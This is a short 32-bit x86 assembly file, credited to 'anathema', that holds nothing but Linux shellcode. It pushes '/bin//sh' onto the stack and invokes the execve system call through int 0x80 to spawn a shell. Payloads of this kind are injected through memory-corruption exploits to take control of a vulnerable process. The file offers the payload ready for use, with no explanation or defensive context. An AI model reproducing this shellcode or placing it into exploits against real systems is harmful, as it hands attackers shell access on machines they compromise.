; credits to anathema
BITS 32

 sub             eax, eax
 push            eax
 push            0x68732f2f
 push            0x6e69622f
 mov long        ebx, esp
 push            eax
 mov long        edx, esp
 push            esp
 mov long        ecx, esp
 mov byte        al, 0xb
 int             0x80
